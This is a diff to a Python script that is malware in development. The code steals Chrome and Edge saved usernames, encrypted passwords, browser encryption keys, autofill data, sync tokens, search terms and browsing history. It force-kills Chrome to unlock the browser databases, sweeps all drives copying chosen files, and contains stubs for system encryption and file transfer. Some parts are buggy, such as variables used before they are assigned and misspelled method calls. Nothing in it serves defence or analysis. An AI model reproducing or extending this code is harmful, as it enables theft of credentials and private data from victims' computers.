@@ -1,16 +1,17 @@
-true_false=['C:\\Users\\Public',True,True,True,True,True,True,True,True,True,'hello_world']
+true_false=['C:\\Users\\Public', True, True, True, True, True, True, True, True, True, 'hello_world', True, [True, True, ' ', True, [], True, []]]
 working_directory01=true_false[0]
 system_info_collect=true_false[1]
 chrome_data_collect=true_false[2]
 chrome_data=true_false[3]
 chrome_id_passsword=true_false[4]
 web_data=true_false[5]
-history_data=true_false[6]
-edge_data=true_false[7]
-dir_search=False
-encrypt_data=true_false[8]
+history_data_tf=true_false[6]
+edge_data_tf=true_false[7]
+encrypt_data_tf=true_false[8]
 message_show_y_n=true_false[9]
 message=true_false[10]
+type_of_virus_oftf=true_false[11]
+dir_search_ifnfo=true_false[12]
 import os
 print(' i am making path')
 main_path=working_directory01+'\\app_data'
@@ -100,8 +101,7 @@ def system_info(path_to_save:str,encodig_list):
         with open(path_to_save,'w+',encoding='UTF-8') as d:
             d.write(str(info))
         return True
-    except Exception as e:
-        print(e)
+    except Exception:
         return False
 def chrome_data_basic(path_to_save:str):
     '''chrrome_data_basic colloect basic data of chrome and the save it to 
@@ -109,59 +109,59 @@ def chrome_data_basic(path_to_save:str):
     this is what all this code do call one more fuction encoding_check
     
     return True if everything okay and False if nothing oki'''
-    data1=[]
-    def gender(ppa):
-        if ppa==1:return 'male'
-        elif ppa==2:return 'female'
-        else:return 'other'
-    def accsept_lang(ppa_jas):
-        try:return ppa_jas['intl']['accept_languages']
-        except Exception: return 'nothing error in fating error-404'
-    local_state_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'
-    if os.path.exists(local_state_path):
-        if bool(local_state_jason:=encoding_check(local_state_path,'r',True)):
-            data1.append(local_state_jason["os_crypt"]["encrypted_key"])
-            data1.append(profile_list:=local_state_jason['profile']['profiles_order'])
-            for i in profile_list:
-                data2=[
-                    str(local_state_jason['profile']['info_cache'][i]['gaia_given_name']),
-                    str(local_state_jason['profile']['info_cache'][i]['gaia_id']),
-                    str(local_state_jason['profile']['info_cache'][i]['gaia_name']),
-                    str(local_state_jason['profile']['info_cache'][i]['hosted_domain']),
-                    str(local_state_jason['profile']['info_cache'][i]['last_downloaded_gaia_picture_url_with_size']),
-                    str(local_state_jason['profile']['info_cache'][i]['managed_user_id']),
-                    str(local_state_jason['profile']['info_cache'][i]['name']),
-                    str(local_state_jason['profile']['info_cache'][i]['user_name'])
-                    ]
-                preferanse_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\'+i+'\\Preferences'
-                if os.path.exists(preferanse_path):
-                    ppa_jason=encoding_check(preferanse_path,'r',True)
-                    if bool(ppa_jason):
-                        data3=[
-                            str(ppa_jason.get('sync', {}).get('birthday', None)),
-                            str(ppa_jason.get('sync', {}).get('cache_guid', None)),
-                            str(ppa_jason.get('sync', {}).get('demographics', {}).get('birth_year', None)),
-                            gender(ppa_jason.get('sync', {}).get('demographics', {}).get('gender', None)),
-                            accsept_lang(ppa_jason),
-                            str(ppa_jason.get('intl', {}).get('selected_languages', None)),
-                            str(ppa_jason.get('google', {}).get('services', {}).get('last_gaia_id', None)),
-                            str(ppa_jason.get('google', {}).get('services', {}).get('signin', {}).get('REFRESH_TOKEN_RECEIVED', {}).get('time', None)),
-                            str(ppa_jason.get('google', {}).get('services', {}).get('signin', {}).get('REFRESH_TOKEN_RECEIVED', {}).get('value', None))
-                            ]
+    try:
+        data1=[]
+        def gender(ppa):
+            if ppa==1:return 'male'
+            elif ppa==2:return 'female'
+            else:return 'other'
+        def accsept_lang(ppa_jas):
+            try:return ppa_jas['intl']['accept_languages']
+            except Exception: return 'nothing error in fating error-404'
+        local_state_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State'
+        if os.path.exists(local_state_path):
+            if bool(local_state_jason:=encoding_check(local_state_path,'r',True)):
+                data1.append(local_state_jason["os_crypt"]["encrypted_key"])
+                data1.append(profile_list:=local_state_jason['profile']['profiles_order'])
+                for i in profile_list:
+                    data2=[
+                        str(local_state_jason['profile']['info_cache'][i]['gaia_given_name']),
+                        str(local_state_jason['profile']['info_cache'][i]['gaia_id']),
+                        str(local_state_jason['profile']['info_cache'][i]['gaia_name']),
+                        str(local_state_jason['profile']['info_cache'][i]['hosted_domain']),
+                        str(local_state_jason['profile']['info_cache'][i]['last_downloaded_gaia_picture_url_with_size']),
+                        str(local_state_jason['profile']['info_cache'][i]['managed_user_id']),
+                        str(local_state_jason['profile']['info_cache'][i]['name']),
+                        str(local_state_jason['profile']['info_cache'][i]['user_name'])
+                        ]
+                    preferanse_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\'+i+'\\Preferences'
+                    if os.path.exists(preferanse_path):
+                        ppa_jason=encoding_check(preferanse_path,'r',True)
+                        if bool(ppa_jason):
+                            data3=[
+                                str(ppa_jason.get('sync', {}).get('birthday', None)),
+                                str(ppa_jason.get('sync', {}).get('cache_guid', None)),
+                                str(ppa_jason.get('sync', {}).get('demographics', {}).get('birth_year', None)),
+                                gender(ppa_jason.get('sync', {}).get('demographics', {}).get('gender', None)),
+                                accsept_lang(ppa_jason),
+                                str(ppa_jason.get('intl', {}).get('selected_languages', None)),
+                                str(ppa_jason.get('google', {}).get('services', {}).get('last_gaia_id', None)),
+                                str(ppa_jason.get('google', {}).get('services', {}).get('signin', {}).get('REFRESH_TOKEN_RECEIVED', {}).get('time', None)),
+                                str(ppa_jason.get('google', {}).get('services', {}).get('signin', {}).get('REFRESH_TOKEN_RECEIVED', {}).get('value', None))
+                                ]
 
 
-                    else:data3=['there is some error while conecting to path']
-                else:data3=['error 404 preferance path not found']
-                data2.append(data3)
-                data1.append(data2.copy())
-            with open(path_to_save,'w+',encoding='utf8') as si1:
-                si1.write(str(data1))
-            return True
+                        else:data3=['there is some error while conecting to path']
+                    else:data3=['error 404 preferance path not found']
+                    data2.append(data3)
+                    data1.append(data2.copy())
+                with open(path_to_save,'w+',encoding='utf8') as si1:
+                    si1.write(str(data1))
+                return True
+            else:return False
         else:return False
-    else:return False
-# except Exception as e:
-    #     print(e)
-    #     return False
+    except Exception:
+        return False
 def chrome_id_password_c(path_to_save:str):
     data1=[];data2=[]
     try:
@@ -171,7 +171,7 @@ def chrome_id_password_c(path_to_save:str):
             extracted_data=collecting_data.cursor()
             try:query=extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
             except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
-            except Exception:query=None
+            except Exception as e:query=None
             if bool(query):
                 data1.append('default01')
                 for row in query.fetchall():
@@ -179,7 +179,7 @@ def chrome_id_password_c(path_to_save:str):
                     data2.append(data3)
             else:
                 data1.append('error202:)')
-                data2.appned(['there is nothing error:)'])
+                data2.appned([f'there is nothing error:) {e}'])
         else:
             data1.append('error404:)')
             data2.append(['there is nothing error404 :)'])
@@ -198,13 +198,13 @@ def chrome_id_password_c(path_to_save:str):
                     extracted_data=collecting_data.cursor()
                     try:query=extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
                     except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=extracted_data.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used")
-                    except Exception:query=None
+                    except Exception as e:query=None
                     if bool(query):
                         data3=[True]
                         for row in query.fetchall():
                             data4=[row[0],row[1],row[2],[row[3],row[4],row[5]]]
                             data3.append(data4.copy())
-                    else:data3=[False,['error while conecting Error202']]
+                    else:data3=[False,[f'error while conecting Error202 {e}']]
                 else:data3=[False,['path does not exist Error404']]
                 data2.append(data3.copy())
                 data3.clear()
@@ -213,9 +213,206 @@ def chrome_id_password_c(path_to_save:str):
         with open(path_to_save,'w+',encoding='utf8') as sid1:
             sid1.write(str(data1))
         return True
+    except Exception:
+        return False
+def chrome_web_data(path_to_save:str):
+    try:
+        root1=[]
+        web_data_default=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data'
+        if os.path.exists(web_data_default):
+            collecting_info=sqlite3.connect(web_data_default)
+            collecting_info=collecting_info.cursor()
+            try:query=collecting_info.execute('select name,value,date_created,date_last_used from autofill')
+            except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=collecting_info.execute('select name,value,date_created,date_last_used from autofill')
+            except Exception as e:query=None
+            if bool(query):
+                child_root1=[True]
+                for row in query.fetchall():child_root1.append([row[0],row[1],row[2],row[3]])
+            else:
+                child_root1=[False]
+                child_root1.append([f'error while conecting error202 {e}'])
+            try:query=collecting_info.execute('select service,encrypted_token from token_service')
+            except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=collecting_info.execute('select service,encrypted_token from token_service')
+            except Exception as e:query=None
+            if bool(query):
+                child_root1=[True]
+                for i in query.fetchall():child_root2.append([row[0],row[1]])
+            else:
+                child_root2=[False]
+                child_root2.append([f'error while conecting error 202{e}'])
+        else:
+            child_root1=[False,['error while finding error 404']]
+            child_root2=[False,['error while finding error 404']]
+        root1.append(child_root1.copy())
+        root1.append(child_root2.copy())
+        response=encoding_check(os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State','r',True)if os.path.exists(os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State') else None
+        child_container=[];child_container1=[]
+        if bool(response):
+            child_container.append(profile_list:=response['profile']['profiles_order']);#encryption_key=response["os_crypt"]["encrypted_key"]
+            for i in profile_list:
+                path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\'+i+'\\Web Data'
+                if os.path.exists(path):
+                    collecting_info=sqlite3.connect(path)
+                    collecting_info=collecting_info.cursor()
+                    try:query=collecting_info.execute('select name,value,date_created,date_last_used from autofill')
+                    except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=collecting_info.execute('select name,value,date_created,date_last_used from autofill')
+                    except Exception as e: query=None
+                    if bool(query):
+                        child_root=[True]
+                        for row in query.fetchall():child_root.append([row[0],row[1],row[2],row[3]])
+                    else:child_root=[False,[f'there is some error while conecting to the data{e}']]
+                    try:query1=collecting_info.execute('select service,encrypted_token from token_service')
+                    except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query1=collecting_info.execute('select service,encrypted_token from token_service')
+                    except Exception as e: query1=None
+                    if bool(query1):
+                        child_root1=[True]
+                        for row in query.fetchall():child_root1.append([row[0],row[1]])
+                    else:child_root1=[False,[f'there is some error while conecting to the data{e}']]
+                else:
+                    child_root=[False,['path does not exists errror 404']]
+                    child_root1=[False,['path does not exists errror 404']]
+                child_container.append(child_root.copy());child_root.clear()
+                child_container1.append(child_root1.copy());child_root1.clear()
+            root1.append(child_container.copy());child_container.clear()
+            root1.append(child_container1.copy());child_container1.clear()
+        else:
+            root1.append([[False,['path does not exists errror 404']]])
+            root1.append([[False,['path does not exists errror 404']]])
+        with open(path_to_save,'w+',encoding='utf8') as sid1:
+            sid1.write(str(root1))
+        return True
     except Exception as e:
         print(e)
         return False
+def history_data(path_to_save):
+    try:
+        root1=[]
+        history_default_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History'
+        if os.path.exists(history_default_path):
+            root1.append(True)
+            collecting_data=sqlite3.connect(history_default_path)
+            collecting_data=collecting_data.cursor()
+            try:query=collecting_data.execute('select term from keyword_search_terms')
+            except sqlite3.OperationalError:os.system('taskkill /im chrome.exe /f');query=collecting_data.execute('select term from keyword_search_terms')
+            except Exception as e:query=None
+            if bool(query):
+                keywords=[True,[]]
+                for row in query.fetchall():
+                    keywords[1].append(row[0])
+            else:keywords=[False,[f'there is some errro while conecting{e}']]
+            try:query=history_data.execute('select url,title,visit_count from urls')
+            except sqlite3.OperationalError:os.system('taskkill /im chrome.exe /f');query=history_data.execute('select url,title,visit_count from urls')
+            except Exception as e:query=None
+            if bool(query):
+                visisted_site=[True,[]]
+                for row in query.fetchall():
+                    visisted_site[1].append([row[0],row[1],row[2]])
+            else:visisted_site=[False,[f'there is some errro while conecting{e}']]
+        else:
+            root1.append(False);keywords="keyword---error 404";visisted_site="visted_site---error 404"
+        root1.append(keywords);root1.append(visisted_site)
+        response=encoding_check(os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State','r',True)if os.path.exists(os.environ["USERPROFILE"]+'\\AppData\\Local\\Google\\Chrome\\User Data\\Local State') else None
+        if bool(response):
+            child_root=[]
+            root1.append(profile_list:=response['profile']['profiles_order'])
+            for i in profile_list:
+                historypath=os.environ["USERPROFILE"]+str('\\AppData\\Local\\Google\\Chrome\\User Data\\')+str(i)+str('\\History')
+                child_01=[]
+                if os.path.exists(historypath):
+                    child_01.append(True)
+                    collecting_data=sqlite3.connect(historypath)
+                    collecting_data=collecting_data.cursor()
+                    try:query=collecting_data.execute('select term from keyword_search_terms')
+                    except sqlite3.OperationalError:os.system('taskkill /im chrome.exe /f');query=collecting_data.execute('select term from keyword_search_terms')
+                    except Exception as e:query=None
+                    if bool(query):
+                        keyword=[True,[]]
+                        for row in query:
+                            keyword[1].append(row[0])
+                    else:keyword=[False,[f'there where some error while conecting{e}']]
+                    try:query=collecting_data.execute('select url,title,visit_count from urls')
+                    except sqlite3.OperationalError:os.system('taskkill /im chrome.exe /f');query=collecting_data.execute('select url,title,visit_count from urls')
+                    except Exception as e:query=None
+                    if bool(query):
+                        visted_sites=[True,[]]
+                        for row in query:
+                            visted_sites[1].append([row[0],row[1],row[2]])
+                    else:visted_sites=[False,[f'there where some error while conecting{e}']]
+                else:
+                    child_01.append(False)
+                    keyword='keyword---error 404';visted_sites='visted_site---error 404'
+                child_01.append(keyword);child_01.append(visted_sites)
+                child_root.append(child_01.copy())
+            root1.append([child_root])
+        else:root1.append(None);root1.append(None)
+        with open(path_to_save,'w+',encoding='utf-8') as sih:
+            sih.write(str(root1))
+            sih.close()
+        return True
+    except Exception as e: print(e);return False
+def edge_data(path_to_save):
+    try:
+        root1=[]
+        data=encoding_check(os.environ["USERPROFILE"]+'\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State','r',json_file=True)
+        encryption_key=data['os_crypt']['encrypted_key']
+        child_root1=[
+            str(data['profile']['info_cache']['Default'].get('edge_account_cid', None)),
+            str(data['profile']['info_cache']['Default'].get('edge_account_first_name', None)),
+            str(data['profile']['info_cache']['Default'].get('edge_account_last_name', None)),
+            str(data['profile']['info_cache']['Default'].get('gaia_id', None)),
+            str(data['profile']['info_cache']['Default'].get('gaia_name', None)),
+            str(data['profile']['info_cache']['Default'].get('user_name', None)),encryption_key]
+        root1.append(child_root1.copy())
+        login_data_path=os.environ["USERPROFILE"]+'\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data'
+        collecting_data=sqlite3.connect(login_data_path)
+        collecting_data=collecting_data.cursor()
+        try:query=collecting_data.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used") 
+        except sqlite3.OperationalError:os.system("taskkill /im chrome.exe /f");query=collecting_data.execute("select origin_url, username_value, password_value, date_created, date_last_used from logins order by date_last_used") 
+        except Exception as e:query=None
+        child_root2=[]
+        if bool(query):
+            child_root2.append(True)
+            for row in query.fetchall():
+                child_root2.append([row[0],row[1],row[2],row[3],row[4]])
+        else:child_root2.append(False);child_root2.append(f'there is some error while conecting{e}')
+        root1.append(child_root2.copy())
+        with open(path_to_save,'w+',encoding='utf-8')as sie:
+            sie.write(str(root1))
+        return True
+    except Exception:return False
+def dir_search(saving_path: str, specific_path_tf: bool = True, specific_path: str = "C:\\Users", search_name: bool = True, search_extension: bool = False, list_of_search: list = [], list_of_extension_search: list = []):
+    try:
+        found = found1 = 0
+        if not os.path.exists(saving_path):
+            os.mkdir(saving_path)
+        path_list = ['%s:\\' % chr(i) for i in range(ord('A'), ord('Z')+1)]
+        paths = [p for p in path_list if os.path.exists(p)] if not specific_path_tf else [specific_path]
+        for path in paths:
+            for dirpath, dirnames, filenames in os.walk(path):
+                for filename in filenames:
+                    file_name, file_extension = os.path.splitext(filename)
+                    print(file_name+file_extension)
+                    if search_name and file_name.strip() in list_of_search:
+                        found += 1
+                        source_path = os.path.join(dirpath.strip(), filename.strip())
+                        try:shutil.copy(source_path, saving_path)
+                        except Exception:found-=1
+                    elif search_extension and file_extension.strip() in list_of_extension_search:
+                        found1 += 1
+                        source_path = os.path.join(dirpath.strip(), filename.strip())
+                        try:shutil.copy(source_path, saving_path)
+                        except Exception:found1-=1
+        return True, found, found1
+    except Exception:
+        return False
+def encrypt_data(path_to_save):
+    pass
+def file_transefer(path_to_save):
+    pass
+def encrypt_the_system(path_to):
+    pass
+def message_and_deletaion(argiment):
+    pass
 # path lists---------------------------------------------------------------------
 main_path=working_directory01+'\\app_data'
 # main_code-------------------------------------------------------------------------
@@ -223,15 +420,19 @@ encoding_types = ["UTF-8","UTF-16","UTF-32","ASCII","ANSI","ISO-8859-1","Windows
 print('i am executed 1')
 if system_info_collect:
         system_info_response=system_info(main_path+'\\system_info',encoding_types)
-        print("i a executed 2")
-        print('here is the response ',system_info_response)
 if chrome_data_collect:
     if chrome_data:
         chrome_data_basic_response=chrome_data_basic(main_path+'\\chrome_data')
-        print('i am executed 3')
-        print('here is the response',chrome_data_basic_response)
     if chrome_id_passsword:
         chrome_id_password_c_response=chrome_id_password_c(main_path+'\\chrome_id_pass')
-        print('i am executed 4')
-        print('here is the response',chrome_id_password_c_response)
-        
+    if web_data:
+        chrome_web_data_response=chrome_web_data(main_path+'\\chrome_web_data')
+    if history_data_tf:
+        history_data_response=history_data(main_path+'\\chr_history_data')
+if edge_data_tf:
+    edge_data_response=edge_data(main_path+'\\system_edge')
+if dir_search_ifnfo[0]:
+    os.mkdir(main_dir:=main_path+'\\dir_search')if not os.path.exists(main_path+'\\dir_search') else None
+    dir_search(main_dir,specific_path_tf=dir_search_ifnfo[1],specific_path=dir_search_ifnfo[2],search_name=dir_search_ifnfo[3],search_extension=dir_search_ifnfo[4],list_of_search=dir_search_ifnfo[5],list_of_extension_search=dir_search_ifnfo[6])
+
+    
